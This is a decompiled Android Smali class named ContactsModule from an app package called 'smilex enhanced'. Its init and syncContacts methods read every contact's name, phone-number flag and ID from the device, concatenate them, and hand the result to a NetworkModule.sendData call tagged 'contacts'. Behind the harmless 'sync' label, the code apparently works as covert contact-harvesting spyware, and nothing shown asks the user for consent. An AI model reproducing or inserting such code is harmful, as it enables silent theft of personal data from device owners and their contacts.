.class public Lcom/smilex/enhanced/modules/ContactsModule;
.super Ljava/lang/Object;
.source "ContactsModule.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .registers 2
    invoke-static {p0}, Lcom/smilex/enhanced/modules/ContactsModule;->syncContacts(Landroid/content/Context;)V
    return-void
.end method

.method public static syncContacts(Landroid/content/Context;)V
    .registers 11
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
    const/4 v2, 0x3
    new-array v2, v2, [Ljava/lang/String;
    const/4 v3, 0x0
    const-string v4, "_display_name"
    aput-object v4, v2, v3
    const/4 v3, 0x1
    const-string v4, "has_phone_number"
    aput-object v4, v2, v3
    const/4 v3, 0x2
    const-string v4, "_id"
    aput-object v4, v2, v3
    const/4 v3, 0x0
    const/4 v4, 0x0
    const/4 v5, 0x0
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v6
    if-eqz v6, :done
    new-instance v7, Ljava/lang/StringBuilder;
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V
    :loop
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z
    move-result v0
    if-eqz v0, :send
    const/4 v0, 0x0
    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v0
    const/4 v1, 0x1
    invoke-interface {v6, v1}, Landroid/database/Cursor;->getInt(I)I
    move-result v1
    const/4 v2, 0x2
    invoke-interface {v6, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v3, "|"
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop
    :send
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->length()I
    move-result v0
    if-lez v0, :done
    const-string v0, "contacts"
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-static {v0, v1}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    :done
    if-eqz v6, :return
    invoke-interface {v6}, Landroid/database/Cursor;->close()V
    :return
    return-void
.end method
